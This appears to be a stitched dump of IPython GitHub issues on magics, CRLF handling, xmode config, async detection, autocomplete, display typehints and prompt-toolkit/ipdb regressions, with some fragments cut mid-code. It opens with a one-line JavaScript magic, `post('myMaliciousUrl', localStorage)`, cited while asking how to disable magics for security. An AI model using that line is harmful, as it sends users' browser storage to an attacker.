```
%%js 
post('myMaliciousUrl', localStorage);
```

Is there a way to disable magic commands? Ideally just for javascript

items.title: CRLF line endings break magics

milestone.description: on-merge: backport to 7.x

items.body:
When a cell contains a (line or cell) magic followed by a CRLF line ending, the CR character seems to be interpreted as part of the magic name, resulting in an error; e.g. `UsageError: Line magic function '%ls\r' not found.`

### Repro:

crlf.ipynb:
```json
{"cells":[{"cell_type":"code","source":["%ls\r\n"],"outputs":[],"execution_count":null,"metadata":{}}],"metadata":{},"nbformat":4,"nbformat_minor":2}
```

```
$ ipython crlf.ipynb
` not found Line magic function `%ls
```

Notice how the CR character causes the output to "wrap around".

items.title: Jupyter Notebook is not showing the output of any code executed on the cell-Solution --ShutDown the previously running notebooks in the background
items.body:
Although I am a beginner, I would like to give a solution to this issue which worked for me quite well . Some of my jupyter notebooks were running in the background which I didn't know as I simply closed the tabs on which they were running.
SOLUTION   :
1. Go to Home tab of jupyter notebook:
2. There are three tabs files, running , clusters.
3. Go to running tab.
4. It will show all the running notebooks.
5.Open each of them.
6. On opening it, on the toggle bar go to Kernel->ShutDown option, click on shutdown. 

Hence this way release all the memory and it would work fine

items.title: Closing window of iTerm2 with running ipython instance leaves spin loop python 3.8 process.
items.body:
When closing the terminal window running ipython 7.15.0 and 7.16.1 from an iTerm2 window with python 3.8.1 python.org framework install on macOS 10.15.4 will leave a stuck python3.8 process at 100% CPU load.

This does not occur with OS X Terminal so it may be an iTerm2 issue.
But with the destruction of the window, leaves a stuck process consuming a processor.

Are there any tips to gather information to assist in debugging this issue?

items.title: What is the key timeout of ipython?
items.body:
I am using ipython with vim mode. In general, it works well. 

But when I press esc and another key like 'b' quickly, it will take it as alt-b. 

In most other terminal applications, there would be a setting item named keytimeout, which control for how long time it would be expecting the next character after entering esc. So I wonder if ipython has a similar setting? I tried to seek for it in online documentation but found nothing. Thank you!

items.title: Strange behavior of IPython after trying to change xmode via config file?
items.body:
According to the result of running command
```
In [N]: %xmode
Exception reporting mode: Verbose
```
without using any config file, the default `xmode` is set to be `Verbose`. However, checking **ipython_config.py** after creating it, the default value is `Context`:
```python
## Switch modes for the IPython exception handlers.
#c.InteractiveShell.xmode = 'Context'
```
Also, when I tried to change `xmode` by modifying **ipython_config.py**, something incomprehensible happened. For instance, if I write
```python
c.InteractiveShell.xmode = 'Verbose'
```
and then check `xmode` in IPython, it turned out:
```
In [N]: %xmode
Exception reporting mode: Minimal
```
I think they don't agree! As well as this unmatched pair `Verbose -> Minimal`, there are:
```
Plain -> Context
Context -> Verbose
(Verbose -> Minimal)
Minimal -> Plain
```
If you use `%xmode?` to get a "standard" sequence of these four modes:
```
In [N]: %xmode?
Docstring:
Switch modes for the exception handlers.

Valid modes: Plain, Context, Verbose, and Minimal.
...
```
You get `Plain, Context, Verbose, Minimal` - so the whole thing seems to be "shifted".

Is that a bug or just my misunderstanding?

items.title: Prompt hard to read because it uses hardcoded colors
items.body:
I find some colors are hard to read, especially the red used for the output when using a dark background. The [contrast ratio is only 2.35](https://contrast-ratio.com/#%23990000-on-black) which is too low according to [WCAG21](https://www.w3.org/TR/WCAG21/#contrast-minimum).

![barely readable red output ptompt on black background](https://user-images.githubusercontent.com/202576/87507527-d4137000-c66d-11ea-8293-8e3b2b6f406c.png)

A similar issue was discussed a while ago in #9670. However, I feel like a crucial aspect was missed: It is impossible to guarantee sufficient contrast if you hardcode colors and don't know the background. So IMHO the better fix would be to not hardcode any colors and use ANSI colors instead.

items.title: IPython doesn't follow the XDG base directory specification

milestone.title: wishlist
milestone.description: Issues with no immediate plans for resolution.

items.body:
Currently IPython uses `~/.ipython` which just clutters people's home directories and makes things like backing up configuration files much more hassle than it should be. 

This was last discussed more than five years ago and should be discussed again. Points made at that point in time frankly, don't really hold up. It is more consistent to follow platform specs, people learn where to look first. Secondly, for support reasons, you don't really have to ask what platform they're on, just mention the three paths in one sentence, it's actually rather easy.

items.title: should_run_async detects simple list comprehensions as async cells and cause bugs

milestone.title: not ipython
milestone.description:
Milestone for issues open after 4.0 that no longer correspond to the ipython/ipython repo.

These may be migrated to their new homes.

items.body:
Trying to understand [this bug](https://github.com/jupyter/notebook/issues/5568) that occurs in both Jupyter Notebook and Jupyter Lab in Python >= 3.8, I noticed that it is related to the async engine of IPython. Code that should execute synchronously is often detected as async:
```
In [1]: get_ipython().should_run_async('[x for x in l]')                        
Out[1]: True
```
It occurs for list comprehensions, set comprehensions, dict comprehensions and generator expressions, but it does not occur for these elements when they are inside a function definition (even when it is called):
```
In [2]: get_ipython().should_run_async('(lambda: [x for x in l])()')                        
Out[2]: False
```

I also checked other ast elements that make this function return True and the only ones that do are the expected ones: `async for`, `async with`, and `await`.

(Fixing this function may solve the bug that I reported on the jupyter/notebook repository, but I think there is something else going on with async executions: when I was developing a Jupyter Lab extension, one of my callbacks for `kernel.requestExecute` received the async response of a notebook cell. Even in an async execution, I think the original cell should receive the response and update its result)

Other information:
```
python -c "import IPython; print(IPython.sys_info())"
{'commit_hash': 'bb015d48b',
 'commit_source': 'repository',
 'default_encoding': 'UTF-8',
 'ipython_path': '/home/joao/projects/ipython/IPython',
 'ipython_version': '8.0.0.dev',
 'os_name': 'posix',
 'platform': 'Linux-4.15.0-20-generic-x86_64-with-debian-buster-sid',

 'sys_platform': 'linux',
 'sys_version': '3.7.3 (default, Mar 27 2019, 22:11:17) \n[GCC 7.3.0]'}
```

items.title: autocomplete calls __getattr__ of class

milestone.title: no action
milestone.description:
A milestone for closed or open issues for which there is no action needed.

- duplicate
- not a bug
- just a question / discussion, nothing to resolve
- wontfix
- etc.

items.body:
Moved from https://github.com/jupyter/notebook/issues/5517.

I have a class whose attributes take some time to initialize, are computed in a separate thread, and attached to the class using `setattr(class, name, time_consuming_instance)`.  Autocomplete works beautifully in this case, and you can even see the attributes added to autocomplete as they are added via the thread.

However, if I mess with the class `__getattr__` to add a wait-loop:

```python

def __getattr__(self, attr):
        while self.refreshing:
            time.sleep(0.1)
            if attr in self.__dict__:
                return self.__dict__[attr]
        if attr not in self.__dict__:
            raise AttributeError("Couldn't load {}.".format(attr))
        return self.__dict__[attr]
```

then autocomplete fails to load when doing a tab on `class.`, and the notebook is stuck waiting for this loop to finish.  When finished all the attributes are in the autocomplete.

Autocomplete uses `__dir__` and in doing so is not blocked on `__getattr__`.  However, it seems like internally there are many calls to `hasattr` ,e.g. https://github.com/ipython/ipython/blob/4f0c46cd551eb818404f70138d1917663826e940/IPython/core/completer.py#L691, and `getattr` that block.

```
import IPython as ipy
from IPython.terminal.interactiveshell import TerminalInteractiveShell

def run():
    shell = TerminalInteractiveShell.instance()
    shell.define_macro('foo', """a,b=10,20""")

if __name__ == "__main__":
```

items.title: test_memory_error and Python 3.9.0a6
items.body:
[test_memory_error](https://github.com/ipython/ipython/blob/master/IPython/core/tests/test_async_helpers.py#L279) is not compatible with Python 3.9.0a6 because the code `iprc("(" * 200 + ")" * 200)` raises `MemoryError` in Python 3.9.0a5 but returns `()` in 3.9.0a6.

It's probably related to a [new parser](https://docs.python.org/3.9/whatsnew/3.9.html#pep-617-new-parser).

items.title: test_embed_svg_url needs internet connection

milestone.description: on-merge: backport to 7.x

items.body:
Hello.

[This part](https://github.com/ipython/ipython/blob/master/IPython/core/tests/test_display.py#L109) of the test_embed_svg_url needs internet connection to download the SVG image from Wiki. But some build systems have internet connection disabled on purpose so this will fail.

It would be nice to have some decorator to skip tests like this when no internet connection is available. What do you think about it?

items.title: eval of a list comprehension returns a coroutine in 3.9

milestone.title: no action
milestone.description:
A milestone for closed or open issues for which there is no action needed.

- duplicate
- not a bug
- just a question / discussion, nothing to resolve
- wontfix
- etc.

items.body:
I'm not sure this is an IPython bug, but it occurs in IPython but not in a regular Python prompt. This also only occurs in Python 3.9 (current version is 3.9.0a5). This was tested with IPython 7.13.0.

The test case that I'm using is evaluating a list comprehension. In Python 3.8 in any environment I've tried, if I run:

```python
print(eval('[i for i in range(3)]'))
```
I get 

```
[0, 1, 2]
```

However, in IPython using Python 3.9 if I run:

```python
print(eval('[i for i in range(3)]'))
```

I get

```
<coroutine object <module> at 0x7efed0a6a340>
<ipython-input-1-d9f23b1bef4d>:1: RuntimeWarning: coroutine '<module>' was never awaited
  print(eval('[i for i in range(3)]'))
RuntimeWarning: Enable tracemalloc to get the object allocation traceback
```

However, If I use the normal Python prompt or the command line:

`python -c "print(eval('[i for i in range(3)]', {}))"` It works. 

Note that `ipython -c "print(eval('[i for i in range(3)]'))"` produces the same coroutine output. 


The reason I'm not sure if this is an IPython bug or not is that I also encounter the issue in [xdoctest](https://github.com/Erotemic/xdoctest)  (where I've currently hacked in a workaround that checks if eval returned a coroutine to prevent if from occurring). But perhaps its a problem in both IPython and xdoctest? I'm really not sure, I'm looking for any reference on what's changed in 3.9 that might have caused this issue but I don't really see anything. 

EDIT:

I found a case where it occurs in Python 3.9 itself (caused by setting compile flags), so perhaps this is a Python issue and not an IPython issue. 

```
python -c "print(eval(compile('[i for i in range(3)]', mode='eval', filename='foo', flags=221184, dont_inherit=True), {}))"
```

items.body:
I am using below code to generate examples from datasets list, 

```py
with futures.ThreadPoolExecutor(max_workers=WORKER_COUNT_DATASETS) as tpool:
        builder_examples = tpool.map(generate_single_visualization, dataset_config_list)
```
here `generate_single_visualization` is some function which generate images and `dataset_config_list` is list of datasets passed. Everything runs fine but in last this error raises

WORKER_COUNT_DATASETS is 10

> Error in atexit._run_exitfuncs:
Traceback (most recent call last):

items.title: Move display classes (JavaScript, HTML...) under IPython.lib.display
items.body:
Following our discussion @Carreau.

In xeus-python, we monkey-patch the `IPython.core.display` module in order to plug the base display functions to the xeus display logic.

Our problem is that there are lots of classes in this module that we don't actually need to monkey patch:
`'DisplayObject', 'TextDisplayObject', 'Pretty', 'HTML', 'Markdown', 'Math', 'Latex', 'SVG', 'ProgressBar', 'JSON', 'GeoJSON', 'Javascript', 'Image', 'set_matplotlib_formats',
'set_matplotlib_close' and 'Video'`. 

We only need to monkey-patch `'display', 'display_pretty', 'display_html', 'display_markdown', 'display_svg', 'display_png', 'display_jpeg', 'display_latex', 'display_json', 'display_javascript', 'display_pdf', 'clear_output', 'publish_display_data' and 'update_display'`

I am wondering if we could move all the classes that we don't need to monkey-patch from `IPython.core.display` to `IPython.lib.display`.

I can come up with a PR myself, I just need the green light from you. I guess this would be a backward-incompatible change (if people are importing from `IPython.core.display`, but not if they import from `IPython.display`).

```python
        else __block.body[0].body

        __block.body
        if not isinstance(__block.body[0], ast.If)
        else __block.body
```

items.body:
As per [the documentation of `%store`](https://ipython.readthedocs.io/en/stable/config/extensions/storemagic.html) it is possible to store multiple variables in the same line:

> `%store spam bar` - Store the current value of the variables spam and bar to disk

This is not possible in **Jupyter Lab 1.0.1 running IPython 7.6.1** and **standalone IPython 7.6.1**.

![screenshot Jupyter Lab demonstrating %store bug](https://user-images.githubusercontent.com/8948865/77630240-fb252500-6f4a-11ea-85c5-ae0eee7302c2.png)

Only the first variable is stored, whereas both variables should be stored.

items.title: display() docstring provides wrong typehints
items.body:
``` python
from IPython.display import display, Markdown
# line below generates warning "Expected type 'tuple', got 'Markdown' instead"
display(Markdown('test'))
```
This issue is due to the docstring for the method display it is:

```python
def display(*objs, include=None, exclude=None, metadata=None, transient=None, display_id=None, **kwargs):
    """ 
   ... Removed some docstring ... 
   Parameters
    ----------
    objs : tuple of objects
        The Python objects to display.
```

rather than 

```python
def display(*objs, include=None, exclude=None, metadata=None, transient=None, display_id=None, **kwargs):
    """ 
   ... Removed some docstring ... 
   Parameters
    ----------
    *objs : object
        The Python objects to display.
```

While [numpydoc](https://numpydoc.readthedocs.io/) is silent on the issue the [napoleon example of numpy style docstrings](https://sphinxcontrib-napoleon.readthedocs.io/en/latest/example_numpy.html) confirms that the latter is indeed the better option. Additionally the latter variant works with IntelliSense while the former does not.

items.title: ipython 5 won't install on python 2.7
items.body:
The latest release (2.6.x) of the pygments dependency is python >=3.5 only.

As the pygment version is unbounded by ipython, this breaks the installation of ipython 5.9.0 on python 2.7 (this is last version supporting python 2).

If you wish to maintain the support of ipython on python 2.7, then you need to pin pygments to <2.6.

items.title: Pretty printing of lists of objects with multiline reprs is suboptimal
items.body:
Consider
```python
def _rep(first, mid, n):
    return first + mid*(n-1) + first*(n>0)
class Rectangle:
    def __init__(self, rows, cols):
        self.rows = rows
        self.cols = cols
    def __repr__(self):
        return '\n'.join(_rep([_rep('+', '-', self.cols)],
                              [_rep('|', '#', self.cols)], self.rows))
```
In Ipython, I get:
```
In [78]: [Rectangle(3, 4), Rectangle(2, 2)]
Out[78]:
[+---+
 |###|
 |###|
 +---+, +-+
 |#|
 +-+]
```
however, I'd expect either of
```
Out[78]:
[+---+
 |###|
 |###|
 +---+, +-+
        |#|
        +-+]
```
or
```

Out[78]:
[+---+
 |###|
 |###|
 +---+,
 +-+
 |#|
 +-+]
```
xref numpy/numpy#11270, which I'd prefer wasn't necessary to solve this for numpy

items.title: No stdout from background thread with prompt-toolkit>=2
items.body:
It's always possible that I'm doing something outside of the realm of what is supposed to be expected behavior, but behavior of my code has changed after the release of `prompt-toolkit v3`. 

Before, a section of my code printed status updates from a background thread to stdout. Following the release of prompt-toolkit 3, that functionality no longer exists. Take for example a piece of minimal code (let's call it `test.py`):

```python
import time
import threading


def test_stdout():
    while(True):
        print('test hello!')
        time.sleep(1)


threading.Thread(target=test_stdout, daemon=True).start()
```

The behavior I expect with `ipython -i test.py` is:

```
Python 3.6.6 (default, Aug 16 2018, 14:51:26)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.10.1 -- An enhanced Interactive Python. Type '?' for help.
test hello!

test hello!
test hello!
test hello!
In [1]:
```

I can confirm that this output is still the case with `prompt-toolkit<3`. With the latest version of `prompt-toolkit==3.0.2`, the output after many of seconds of time is:

```
Python 3.6.6 (default, Aug 16 2018, 14:51:26)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.10.1 -- An enhanced Interactive Python. Type '?' for help.
test hello!

In [1]:
``` 

Here's my IPython environment:


items.title: Ipdb and Flask No longer work together
items.body:
I wanted to mention this here. I can't be the only that uses flask and ipdb together. Using "import ipdb;ipdb.set_trace()" has worked well in flask apps for the longest time up until a recent update. I tracked it down to ipython. v7.9.0 works but v7.10.0 does not. :(

Just wanted someone to be aware. Is it possible to get an explanation of what might have caused this? Wondering if there might be a workaround possibly? For now, downgrading to v7.9.0 works for now. Just would be nice to know if I have to look for another solution in the future.

It now gives this error when hitting the breakpoint:
```
File "/.venv/lib/python3.7/site-packages/IPython/terminal/debugger.py", line 97, in cmdloop
    line = self.pt_app.prompt() # reset_current_buffer=True)
  File "/.venv/lib/python3.7/site-packages/prompt_toolkit/shortcuts/prompt.py", line 986, in prompt
    return self.app.run()
  File "/.venv/lib/python3.7/site-packages/prompt_toolkit/application/application.py", line 788, in run
   return get_event_loop().run_until_complete(self.run_async(pre_run=pre_run))
  File "/usr/lib/python3.7/asyncio/events.py", line 644, in get_event_loop
    % threading.current_thread().name)
RuntimeError: There is no current event loop in thread 'Thread-3'.
```
Reproducing this error can be done with the simplest flask app:
```
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    import ipdb;ipdb.set_trace()
    return 'Hello, World!'
```

Thanks!

The debugger of IPython<7.10 can be used as pytest's pdb by passing `--pdb --pdbcls=IPython.terminal.debugger:TerminalPdb` to pytest (e.g. create a single failing test and run it with `pytest --pdb --pdbcls=IPython.terminal.debugger:TerminalPdb`).
